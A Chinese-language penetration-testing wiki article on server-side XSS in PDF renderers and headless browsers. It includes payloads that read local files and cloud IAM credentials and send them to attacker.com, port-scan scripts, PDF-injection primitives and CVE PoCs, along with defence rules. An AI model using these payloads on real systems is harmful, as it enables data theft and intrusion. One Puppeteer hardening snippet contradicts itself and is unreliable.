---
attack_surface: [文件类, 注入类, 服务端利用, 信息泄露]
impact: [信息泄露, 机密性破坏, 远程代码执行(服务端), 完整性破坏]
risk_level: 高
prerequisites:
  - XSS 基础（HTML/CSS/JavaScript 注入原理）
  - Headless Browser / SSR 概念
  - SSRF 基础（攻击链条场景）
related_techniques:
  - xss
  - ssrf
  - csti-client-side-template-injection
  - pdf-injection
  - file-upload
difficulty: 中级
tools:
  - Burp Suite + Burp Collaborator
  - Puppeteer / Chromium
  - qpdf / pdfid.py / pdf-parser.py
  - curl
---

# Server Side XSS (Dynamic PDF) — 服务端跨站脚本攻击
> 关联文档：[XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [PDF Injection](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/pdf-injection.html)

---

# 0x01 背景与原理

## 1.0 TL;DR

Server Side XSS 发生在**服务端使用浏览器引擎渲染用户可控内容**时——PDF 生成器、截图服务、SEO 预渲染、SSR 框架。与客户端 XSS 不同，恶意脚本在**服务端执行**，可读取本地文件（`file:///etc/passwd`）、扫描内网端口、窃取云 metadata，并通过 [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) 链升级为 RCE。

## 1.1 什么是 Server Side XSS

传统 XSS 中，恶意脚本在**受害者浏览器**中执行，危害限于当前用户会话。Server Side XSS 则是：攻击者提交的 HTML/JavaScript 被**服务端浏览器引擎解析执行**——执行上下文是服务器而不是客户端。

```
客户端 XSS:
  用户提交 <script> → 服务器存储/反射 → 其他用户浏览器执行 → 窃取 Cookie

Server Side XSS:
  用户提交 <script> → 服务器用 Chromium/wkhtmltopdf 渲染 → 服务端执行 JS → 
  读取 /etc/passwd / 访问 169.254.169.254 / 扫描内网
```

## 1.2 与客户端 XSS 的本质区别

| 维度 | 客户端 XSS | Server Side XSS |
|------|-----------|-----------------|
| **执行环境** | 受害者浏览器 | 服务端浏览器引擎 |
| **同源策略** | 受限于页面 origin | 无 origin 限制（`file://` 路径） |
| **危害范围** | 当前用户会话 | 服务器文件系统、内网、云 metadata |
| **CSP 有效性** | 可限制 | 通常未配置或无效 |
| **触发方式** | 用户访问恶意链接/页面 | 用户提交内容后服务端自动渲染 |
| **OOB 验证** | XSSHunter / Burp Collaborator | 同样适用（HTTP/DNS 回调） |

## 1.3 攻击面总览

```
┌──────────────────────────────────────────────────────┐
│               Server Side XSS 攻击面                   │
├──────────────────────────────────────────────────────┤
│  PDF 生成器 (wkhtmltopdf / Puppeteer / Prince / iText)│
│  Headless Browser (截图 / 预览 / SEO Bot / 社交卡片)    │
│  SSR 框架 (Next.js / Nuxt / Gatsby / Angular Universal)│
│  Email HTML 渲染 (邮件服务端预览)                        │
│  报告生成服务 (JasperReports / BIRT / ReportLab)        │
└──────────────────────────────────────────────────────┘
```

---

# 0x02 服务端执行环境分类

## 2.1 PDF 生成引擎

最常见的 Server Side XSS 入口。用户提交 HTML 内容（发票、报告、简历），服务端将其渲染为 PDF。

| 引擎 | 底层浏览器 | 已知风险 | 关键标志 |
|------|-----------|---------|---------|
| **wkhtmltopdf** | QtWebKit (旧版 WebKit) | JS 执行 + 默认启用本地文件访问 | `--enable-local-file-access` 默认开启 |
| **Puppeteer** | Chromium | 完整 Chrome JS 引擎 + DevTools 协议 | 通过 `page.pdf()` 生成 |
| **Playwright** | Chromium / Firefox / WebKit | 同 Puppeteer | 多浏览器支持 |
| **Prince XML** | 自研引擎 | JS 支持有限但存在 PDF object 注入 | 商业软件 |
| **TCPDF** | PHP 原生（无浏览器） | 不支持 JS，但存在 HTML/SVG → PDF 路径遍历 | PHP 生态主流 |
| **PDFKit** | Node.js 原生 | 有限 JS 支持 | Node.js 生态 |
| **iText / FPDF** | Java/PHP 原生 | PDF object 注入 | 企业 Java 生态 |

### wkhtmltopdf 特殊风险

`wkhtmltopdf` 默认启用以下危险选项：

```bash
# 默认行为等价于
wkhtmltopdf --enable-local-file-access --enable-javascript input.html output.pdf
```

这意味着 `<script>` 标签不仅会执行，还能通过 `XMLHttpRequest` 读取 `file:///etc/passwd`。

### Puppeteer/Playwright 生成模式

```javascript
// 常见不安全的 PDF 生成代码
const browser = await puppeteer.launch({ args: ['--no-sandbox'] });
const page = await browser.newPage();
await page.setContent(userInputHTML);  // ← 用户可控 HTML
await page.pdf({ path: 'output.pdf' });
```

## 2.2 Headless Browser 服务

### 截图服务

用户输入 URL 或 HTML，服务端用 headless 浏览器截图：

```bash
# 典型实现
puppeteer.screenshot({ url: userInput })    # ← 用户可控 URL
puppeteer.setContent(userHTML).screenshot() # ← 用户可控 HTML
```

触发点：社交媒体预览生成、网站缩略图服务、URL 健康检查 bot。

### SEO / 社交预览渲染

Googlebot、Twitterbot、Slackbot 等服务端抓取页面时执行 JS 生成预览卡片。如果攻击者控制的页面被这些 bot 访问，恶意 JS 可在 bot 上下文中执行——尽管这通常只影响外部机器，但在内部 SEO 预渲染服务中可能访问内网。

### 最小化探测

提交包含 OOB 回调的 HTML 片段即可判断是否存在 headless 渲染：

```html
<img src="http://your-collaborator.net/ping">
```

任何对 `your-collaborator.net` 的请求都证明服务端检索了 HTML 并尝试渲染。

## 2.3 服务端渲染框架 (SSR)

Next.js、Nuxt、Angular Universal 等框架在服务端预渲染页面。如果用户输入被注入到 SSR 渲染模板中，服务端 `renderToString()` 可能执行恶意逻辑。

```jsx
// Next.js SSR 不安全示例
export async function getServerSideProps(context) {
  const userContent = context.query.content;  // ← 用户可控
  return { props: { content: userContent } };
}

function Page({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />; // ← Server Side XSS
}
```

关键区别：`dangerouslySetInnerHTML` 在 SSR 中同样危险——但执行环境是服务端 Node.js 而不是浏览器。

## 2.4 Email HTML 渲染

邮件服务端或客户端在预览/渲染 HTML 邮件时，可能解析并执行内嵌脚本（取决于渲染引擎的沙箱策略）。虽然主流邮件客户端会过滤 `<script>`，但 CSS-based 数据窃取和 `<img>` OOB 回调在服务端预览场景中仍然有效。

---

# 0x03 指纹识别与探测

## 3.1 服务端浏览器引擎识别

通过 JS 引擎差异识别服务端使用的渲染器：

```html
<!-- 探测 JS 引擎类型 -->
<script>
document.write(navigator.userAgent);           // 直接输出 UA
document.write(JSON.stringify(window.navigator)); // 完整 navigator 对象
</script>

<!-- 探测可用 API (Chromium vs QtWebKit) -->
<img src="x" onerror="
  var features = [];
  if (typeof window.chrome !== 'undefined') features.push('Chromium');
  if (typeof window.navigator.qt !== 'undefined') features.push('QtWebKit');
  if (window.callPhantom) features.push('PhantomJS');
  new Image().src = 'http://attacker.com/fp?' + features.join(',');
">
```

## 3.2 上下文探测 Payload

```html
<!-- 基础可达性探测 — 最轻量 -->
<img src="http://attacker.com/ping">

<!-- 确认 JS 执行 -->
<img src="x" onerror="document.write('test')">
<script>document.write(JSON.stringify(window.location))</script>

<!-- 确认文件系统访问能力 -->
<img src="x" onerror="document.write(window.location)">
<script>document.write(window.location)</script>
<!-- 如果返回 file:// 路径 → 文件系统可达 -->

<!-- 外置脚本加载确认 -->
<script src="http://attacker.com/test.js"></script>
<img src="x" onerror="document.write('<script src=http://attacker.com/test.js></script>')">
```

## 3.3 OOB 确认方法

```
测试流程:
  1. 注入 <img src="http://collaborator.net/ping">
  2. 收到 HTTP 请求 → 确认 HTML 被检索
  3. 注入 <img src=x onerror="fetch('http://collaborator.net/js_ok')">
  4. 确认 JS 执行 → Server Side XSS 成立
  5. 注入 file:///etc/passwd 读取 payload
```

---

# 0x04 Payload 技术库

## 4.1 PDF 上下文专用 Payload

### 4.1.1 信息泄露 — 路径暴露

```html
<img src="x" onerror="document.write(window.location)">
<script> document.write(window.location) </script>
```

### 4.1.2 本地文件读取

```html
<!-- XMLHttpRequest 读取 -->
<script>
x = new XMLHttpRequest;
x.onload = function() { document.write(btoa(this.responseText)) };
x.open("GET", "file:///etc/passwd");
x.send();
</script>

<!-- iframe 嵌入 -->
<iframe src="file:///etc/passwd"></iframe>
<img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')">

<!-- object/embed 标签 -->
<object data="file:///etc/passwd">
<embed src="file:///etc/passwd" width="400" height="400">

<!-- meta 刷新 -->
<meta http-equiv="refresh" content="0;url=file:///etc/passwd">
```

### 4.1.3 SVG 文件读取（路径遍历）

```html
<!-- SVG foreignObject + iframe -->
<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="500">
  <g>
    <foreignObject width="800" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <iframe src="file:///etc/passwd" width="800" height="500"></iframe>
        <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
      </body>
    </foreignObject>
  </g>
</svg>
```

### 4.1.4 云 Metadata 窃取

```html
<script>
fetch('http://169.254.169.254/latest/meta-data/')
  .then(r => r.text())
  .then(d => {
    new Image().src = 'http://attacker.com/exfil?data=' + btoa(d);
  });
</script>
```

### 4.1.5 PD4ML 附件提取

`PD4ML` 是 Java HTML-to-PDF 库，支持 `<pd4ml:attachment>` 标签。若注入点落入 PD4ML 处理流程：

```html
<html>
  <pd4ml:attachment
    src="/etc/passwd"
    description="attachment sample"
    icon="Paperclip" />
</html>
```

生成的 PDF 将包含 `/etc/passwd` 作为附件，在支持附件的 PDF 阅读器中可直接提取。

## 4.2 Chromium/Headless 上下文

### 4.2.1 端口扫描

```html
<script>
const checkPort = (port) => {
    fetch(`http://127.0.0.1:${port}`, { mode: "no-cors" }).then(() => {
        new Image().src = `http://attacker.com/ping?port=${port}`;
    });
};
for (let i = 0; i < 1000; i++) {
    checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```

### 4.2.2 Bot 延迟检测

```html
<script>
let time = 500;
setInterval(() => {
    new Image().src = `https://attacker.com/ping?time=${time}ms`;
    time += 500;
}, 500);
</script>
```

通过 ping 间隔确定 bot 活跃时长——决定 payload 需要多快执行完。

### 4.2.3 SSRF 载荷

```html
<!-- 基础 SSRF -->
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(d => { new Image().src = 'http://attacker.com/?d=' + btoa(d); });
</script>

<!-- base 标签劫持 -->
<base href="http://attacker.com">

<!-- meta 标签 SSRF -->
<meta http-equiv="refresh" content="0; url=http://169.254.169.254/">

<!-- link 标签 -->
<link rel="stylesheet" href="http://attacker.com/exfil">

<!-- 多媒体标签 -->
<video src="http://attacker.com"></video>
<audio src="http://attacker.com"></audio>
<source src="http://attacker.com">
```

## 4.3 PDF Object Injection (原生 PDF 语法注入)

当用户输入被**直接嵌入 PDF 文件内容**（非 HTML → PDF 转换）时：

### 4.3.1 注入原语速查

| 目标 | Payload | 适用场景 |
|------|---------|----------|
| 打开时执行 JS | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Acrobat/Reader |
| 点击时执行 JS | `/A << /S /JavaScript /JS (app.alert(1)) >>` | 控制 link annotation |
| 附加动作 | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | 鼠标进入/获取焦点 |
| 盲回调 | `/A << /S /URI /URI (https://attacker.tld/) >>` | OOB 可达性验证 |
| 内容窃取 | `for (...) this.getPageNthWord(...)` | PDF 内容逐词泄露 |
| 表单提交 | Widget + `this.submitForm(...)` | 比 `/URI` 更强 |

### 4.3.2 典型利用方法

```
输入点 → PDF 字符串中未转义的 ( ) \
  → 字典闭合 + 注入新 PDF 对象
  → /OpenAction /JS 执行
```

```pdf
# 注入点示例：用户输入 reflected 到 PDF string
# 若输入 ) 可闭合括号，则：
) /A << /S /JavaScript /JS (app.alert(1)) >> (
```

### 4.3.3 Widget/AcroForm 升级

```pdf
#)>> << /Type /Annot /Rect [0 0 900 900] /Subtype /Widget
/Parent << /FT /Btn /T(a) >>
/A << /S /JavaScript /JS (app.alert(1)) >>
```

### 4.3.4 PDF.js FontMatrix 注入 (CVE-2024-4367)

**影响范围：** Firefox < 126、Firefox ESR < 115.11、Thunderbird < 115.11、pdfjs-dist <= 4.1.392。同时影响所有内嵌 PDF.js 的应用——包括 Electron 桌面应用和 `react-pdf` 等 React 组件库。

**精确版本表：**

| 版本 | 状态 | 原因 |
|------|------|------|
| v0.8.1181 (2014-04) | 受影响 | 首个公开发布版 |
| v1.4.20 (2016-01) | 受影响 | — |
| v1.5.188 (2016-04) | **不受影响** | 一个意外 typo 导致 `isEvalSupported` 失效路径被跳过 |
| v1.9.426 (2017-08) | 不受影响 | 在下一受影响版本之前 |
| v1.10.88 (2017-10) | 受影响 | typo 修复重新引入了漏洞代码路径 |
| v4.1.392 (2024-04) | 受影响 | 修复前的最后一个版本 |
| v4.2.67 (2024-04-29) | **不受影响** | 已修复 |

**根因代码路径：**

```
FontMatrix 数组 → extractFontHeader() 读取 → translateFont() 传递
  → compileGlyph() 调用 fontMatrix.slice()
  → compileGlyphImpl() 将 slice 结果拼入 JS 命令字符串
  → new Function("c", "size", jsBuf.join("")) 执行
```

关键代码在 `compileGlyph()` 中：

```javascript
const cmds = [
  { cmd: "save" },
  { cmd: "transform", args: fontMatrix.slice() },  // ← slice() 返回原始值
  { cmd: "scale", args: ["size", "-size"] },
];
this.compileGlyphImpl(code, cmds, glyphId);
```

`fontMatrix.slice()` 返回的数组直接作为 `c.transform()` 的参数——如果数组元素包含字符串 `(0\); alert('foobar')`，则生成的 JS 代码为 `c.transform(1,2,3,4,5,0\); alert('foobar'));`，闭合括号后注入任意 JS。

**Payload：**

```pdf
/FontMatrix [1 2 3 4 5 (0\); alert('foobar')]
```

**缓解措施：**

1. 升级 pdfjs-dist 至 >= v4.2.67
2. 设置 `isEvalSupported = false` 禁用 `new Function` 代码路径（CSP 禁止 `unsafe-eval` 时同样生效）
3. Electron 应用需检查 `node_modules` 中间接依赖的 pdf.js 版本——`react-pdf` 等组件库曾捆绑受影响版本

### 4.3.5 jsPDF addJS() 注入 (CVE-2026-25755)

```javascript
// JavaScript PDF 生成库 jsPDF 中
// addJS() 方法对用户输入未转义
const doc = new jsPDF();
doc.addJS("console.log('x');) >> /AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>");
// 注入的 PDF object 通过 addJS 写入
```

### 4.3.6 jsPDF createAnnotation() 注入

`addJS()` 不是 jsPDF 唯一的注入面。`createAnnotation()` 的 `url` 参数同样将用户输入**直接写入 PDF 对象字符串**而不转义括号和反斜线：

```javascript
// jsPDF createAnnotation — url 参数可注入
const doc = new jsPDF();
doc.createAnnotation({
  bounds: {x: 0, y: 10, w: 200, h: 200},
  type: 'link',
  url: `/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`
});
```

### 4.3.7 PDFKit / PDF-Lib 的 PDFString 注入

PDFKit 和 PDF-Lib 使用 `PDFString.of()` 构造 PDF 字符串对象。如果用户输入未经转义传入：

```javascript
// PDFKit — link annotation 中的 PDFString.of()
const linkAnnotation = pdfDoc.context.obj({
  Type: 'Annot',
  Subtype: 'Link',
  A: {
    Type: 'Action',
    S: 'URI',
    URI: PDFString.of(`/input`),  // ← 用户输入直接进入 PDF 字符串
  }
});

// PDF-Lib 同模式
A: {
  Type: 'Action',
  S: 'URI',
  URI: PDFString.of(`injection)`),  // ← 闭合括号后注入 PDF 对象
}
```

**根本原因**（PortSwigger 总结）：这些库在将用户输入写入 PDF 字符串时**未对 `(` `)` `\` 三个字符做转义**。PDF 字符串以 `(` 开头 `)` 结尾，输入中的 `)` 可提前闭合字符串，后续内容被解析为 PDF 操作符。

### 4.3.8 无交互自动执行

利用 Page Visible (PV) / Page Invisible (PI) 触发器，无需用户点击即可执行 JS：

```javascript
// Screen annotation — 页面可见时自动触发
const doc = new jsPDF();
doc.createAnnotation({
  bounds: {x: 0, y: 10, w: 200, h: 200},
  type: 'link',
  url: `/)>> >>
    <</Subtype /Screen /Rect [0 0 900 900] /AA <</PV
    <</S/JavaScript/JS(app.alert(1))>>/(`  // ← PV = Page Visible, 自动执行
});
```

`/AA` 字典支持的触发器：`/PV`(Page Visible)、`/PI`(Page Invisible)、`/PO`(Page Open)、`/PC`(Page Close)、`/E`(Enter)、`/X`(Exit)。其中 PV/PO 在页面加载时自动触发，无需用户交互。

### 4.3.9 PDF 结构分析工具

```bash
# 结构化输出 PDF 内容
qpdf --qdf --object-streams=disable victim.pdf readable.pdf

# 快速关键字扫描
pdfid.py readable.pdf
pdf-parser.py -search "/JS" -search "/AA" -search "/OpenAction" readable.pdf

# grep 快速定位
rg -n '/URI|/JS|/AA|/OpenAction|/Subtype /Link|/Subtype /Widget' readable.pdf
```

## 4.4 SSR 上下文注入

```jsx
// Next.js SSR — 用户输入导致的 dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{
  __html: '<img src=x onerror="fetch(\'http://attacker.com?c=\'+document.cookie)">'
}} />

// Vue Nuxt — v-html 在服务端渲染时同样不转义
<div v-html="userInput"></div>
```

SSR 场景中的特殊考虑：Node.js 服务端可访问 `process.env`、文件系统模块等——如果 SSR payload 能触发 server-side code execution（例如通过 `require` 或 `eval`），影响远超 XSS。

---

# 0x05 攻击链：SSRF → Server Side XSS → RCE/LFI

## 5.1 完整攻击链模型

```
[外部攻击者]
    │
    ▼
[Web 应用] ──用户可控 HTML 输入──→ [PDF/截图/渲染服务]
    │                                    │
    │                              ┌─────┴──────┐
    │                              │ JS 执行:    │
    │                              │ · file://   │ ← LFI
    │                              │ · localhost  │ ← 内网扫描
    │                              │ · 169.254    │ ← 云 metadata
    │                              │ · DNS/HTTP   │ ← OOB 数据窃取
    │                              └──────────────┘
    ▼
[攻击者 Collaborator] ←── 窃取的数据
```

## 5.2 SSRF 触发内部渲染服务

许多组织中，PDF 生成/截图服务部署在内网作为微服务：

```
Nginx → App Server → http://pdf-service.internal:3000/render?html=...
                              ↑ SSRF 可达的目标
```

如果攻击者通过 [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) 发现 `pdf-service.internal:3000`，可向其投喂恶意 HTML，触发 Server Side XSS → 从内部读取云 metadata。

## 5.3 本地文件读取 (LFI) 技术

```html
<!-- 读取 /etc/passwd（URL 编码绕过） -->
<script>
x = new XMLHttpRequest();
x.onload = function() {
    new Image().src = 'http://attacker.com/?d=' + btoa(x.responseText);
};
x.open("GET", "file:///etc/passwd");
x.send();
</script>

<!-- 读取敏感配置文件 -->
file:///proc/self/environ          # 环境变量（含 API Key）
file:///proc/self/cwd/.env         # Node.js/Python .env
file:///root/.bash_history         # 命令历史
file:///var/run/docker.sock        # Docker socket（可能实现 RCE）
```

## 5.4 远程代码执行 (RCE) 路径

| 路径 | 条件 | 技术 |
|------|------|------|
| wkhtmltopdf `--enable-local-file-access` + JS | 默认配置 | `file://` 读 + 外部 exfil |
| Puppeteer `--no-sandbox` | Docker/K8s 部署 | Node.js `require` 逃逸 |
| PDF.js CVE-2024-4367 | 未更新版本 | FontMatrix `c.transform` 通过 `new Function` 执行 |
| ReportLab CVE-2023-33733 | 未更新版本 | 三重括号 `{{{ }}}` 表达式求值 |
| PhantomJS (已废弃) | 遗留系统 | `require('child_process').exec()` |

---

# 0x06 防御与缓解

## 6.1 浏览器沙箱化

```bash
# wkhtmltopdf — 禁用危险特性
wkhtmltopdf --disable-local-file-access \
            --disable-javascript \
            --no-stop-slow-scripts \
            input.html output.pdf

# Puppeteer — 沙箱模式
const browser = await puppeteer.launch({
    args: [
        '--no-sandbox',                     // 仅在容器中需要
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-web-security',           // ← 绝对禁止
    ]
});
```

关键 Puppeteer 安全配置：

```javascript
// 推荐的安全启动配置
const browser = await puppeteer.launch({
    args: ['--disable-web-security=false'], // 保持 web 安全
    ignoreDefaultArgs: ['--disable-web-security'], // 禁止覆盖
});

const page = await browser.newPage();
await page.setRequestInterception(true);
page.on('request', (req) => {
    const url = req.url();
    // 阻止 file:// 和内部 IP 访问
    if (url.startsWith('file://') ||
        url.match(/^https?:\/\/(127\.|10\.|172\.1[6-9]|172\.2\d|172\.3[01]|192\.168|169\.254)/)) {
        req.abort();
    } else {
        req.continue();
    }
});
```

## 6.2 网络层隔离

```
┌─────────────┐     ┌──────────────┐     ┌─────────────┐
│  公网 App    │────→│  渲染微服务    │────→│  Collaborator│
│             │     │  (独立 VPC)   │  ✗  │  file://     │
│             │     │  (无外网出口)  │  ✗  │  localhost   │
└─────────────┘     └──────────────┘  ✗  │  169.254     │
                                         └─────────────┘
```

- 渲染服务放在独立网络段，无外网出口（阻止 OOB 数据窃取）
- 静态 iptables/nftables 规则阻止 `file://` 协议和 metadata IP 的出站请求
- 渲染服务不应有访问内网敏感服务的网络权限

## 6.3 输入过滤与输出编码

```python
# 在 HTML 内容进入渲染引擎前过滤
import re

DANGEROUS_PATTERNS = [
    r'file://',                          # 本地文件读取
    r'169\.254\.169\.254',               # 云 metadata
    r'<script[^>]*>',                    # Script 标签
    r'onerror\s*=',                      # 事件处理器
    r'onload\s*=',
    r'<iframe[^>]*>',
    r'<embed[^>]*>',
    r'<object[^>]*>',
    r'<meta[^>]*http-equiv',
]

def sanitize_html_content(html):
    for pattern in DANGEROUS_PATTERNS:
        html = re.sub(pattern, '', html, flags=re.IGNORECASE)
    return html
```

> `re.sub` 黑名单过滤只是第一层防线。更安全的做法是使用 HTML 净化库（DOMPurify on server side、OWASP Java HTML Sanitizer）并配合严格的 CSP。

## 6.4 运行时检测规则

| 检测层 | 规则 |
|--------|------|
| **静态审计** | 搜索代码中 `page.setContent()` / `page.pdf()` / `wkhtmltopdf` 调用，检查用户输入是否直接传入 |
| **流量分析** | 监控渲染服务向外部 IP 的 HTTP/DNS 请求（正常渲染不应产生） |
| **文件访问** | `auditd` 监控渲染进程对 `/etc/`、`/proc/` 的读取操作 |
| **PDF 结构** | 解析生成 PDF 的 `/JS`、`/OpenAction`、`/AA` 对象——这些不应出现在数据驱动的 PDF 中 |
| **进程行为** | 渲染进程不应 fork 子进程或加载非渲染相关 `.so` 文件 |

---

## 参考资料

- [HackTricks — Server Side XSS (Dynamic PDF)](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html)
- [HackTricks — PDF Injection](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/pdf-injection.html)
- [Gareth Heyes, "Portable Data exFiltration: XSS for PDFs" — PortSwigger Research](https://portswigger.net/research/portable-data-exfiltration)
- [Thomas Rinsma, "CVE-2024-4367 — Arbitrary JavaScript execution in PDF.js"](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/)
- [buer.haus — Escalating XSS in PhantomJS Image Rendering to SSRF/Local File Read](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
- [noob.ninja — Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
- [Intigriti — Exploiting PDF Generators: A Complete Guide to Finding SSRF Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators)
- [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
